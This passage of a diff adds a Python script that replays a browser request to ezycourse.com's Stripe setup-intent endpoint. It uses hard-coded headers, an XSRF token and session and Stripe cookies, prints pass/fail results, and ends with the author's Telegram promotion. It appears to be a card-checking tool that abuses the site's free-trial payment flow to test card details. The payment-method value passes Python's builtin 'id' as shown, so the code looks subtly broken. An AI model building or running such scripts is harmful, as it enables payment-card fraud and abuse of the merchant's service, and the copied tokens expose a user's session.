+    'content-type': 'application/json',
+    'origin': 'https://ezycourse.com',
+    'priority': 'u=1, i',
+    'referer': 'https://ezycourse.com/signup?plan=pro&interval=month&trial=true&utm_source=header&utm_medium=nav_cta&utm_campaign=free_trial&utm_content=mobile_try_free_14d',
+    'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
+    'x-xsrf-token': 'e:ZflHllbI4_yAXmKRr-Lw0vezD3DEd-V0lDD1kUFTQydg5HjP9vX58TS3rJLROUl38csw98fjKGYjJPtv4T3KSRP3ZXVlcr7lxwb0-JLTw6U.SmZtYk82S0JoLXdKckR3Xw.16dtZF50jEuYYCRAuccc5cH9ZBusrkVMQn-QOD6CGwY',
+    # 'cookie': '_gcl_au=1.1.984969927.1784905915; _fbp=fb.1.1784905915548.957180182637388509; ruccd=s%3AeyJtZXNzYWdlIjoiTlAiLCJwdXJwb3NlIjoicnVjY2QifQ.aeXzvLoJEjSPwyqj2x2QsFXk3taNThBZ76FIsO9nq4Q; swuid=s%3AeyJtZXNzYWdlIjoiY21yejJ3cHNzOXB3ajZ2cXJoNWRkMGJpZyIsInB1cnBvc2UiOiJzd3VpZCJ9.s_ZACgWIAQo3N2UoltoocYEDzj17ZFUZgVJ0B3sv8P4; crisp-client%2Fsession%2Fa09eea92-f4ec-4c30-86be-838a16c1c7aa=session_6054a039-58bd-4791-969d-568ca28e49cd; crisp-client%2Fsocket%2Fa09eea92-f4ec-4c30-86be-838a16c1c7aa=1; cookieyes-consent=consentid:SkV1T28zMnZtNlZzQkNmUDFxNTlDU294eDNUWVBHMFY,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; XSRF-TOKEN=e%3AZflHllbI4_yAXmKRr-Lw0vezD3DEd-V0lDD1kUFTQydg5HjP9vX58TS3rJLROUl38csw98fjKGYjJPtv4T3KSRP3ZXVlcr7lxwb0-JLTw6U.SmZtYk82S0JoLXdKckR3Xw.16dtZF50jEuYYCRAuccc5cH9ZBusrkVMQn-QOD6CGwY; utm_source_cookie=s%3AeyJtZXNzYWdlIjp7InV0bV9zb3VyY2UiOiJoZWFkZXIiLCJpcCI6IjI0MDA6MWEwMDo2YjRkOjE2MDQ6NzhiZDplOTc5OjJmN2Q6YjY4ZiIsImNvdW50cnlfY29kZSI6Ik5QIiwiaXRlbV9pZCI6Njk1MTN9LCJwdXJwb3NlIjoidXRtX3NvdXJjZV9jb29raWUifQ.GcIBfwdZADj3kFCn_lfp27n4zc9vZr4vNaLhVzwVW3I; __stripe_mid=c7a04ac3-3231-449a-a4aa-3160117892d5ca7f87; __stripe_sid=1c8957bc-3a18-4c66-921a-f64fc6d10971b88b1d',
+}
+
+json_data = {
+    f'stripe_payment_method_uuid': id ,
+    'is_trial': True,
+}
+
+response = requests.post(
+    'https://ezycourse.com/api/ezycourse/onboarding/create-setup-intent',
+    headers=headers,
+    json=json_data,
+)
+
+print(response.json())
+if response.status_code == 200:
+    print("Request successful!")    
+if response.status_code == 400:
+    print("Request failed!")
+    print(response.json())
+
+#done lets test this now 
+
+#code by diwazz
+
+webbrowser.open("t.me/diwazz")
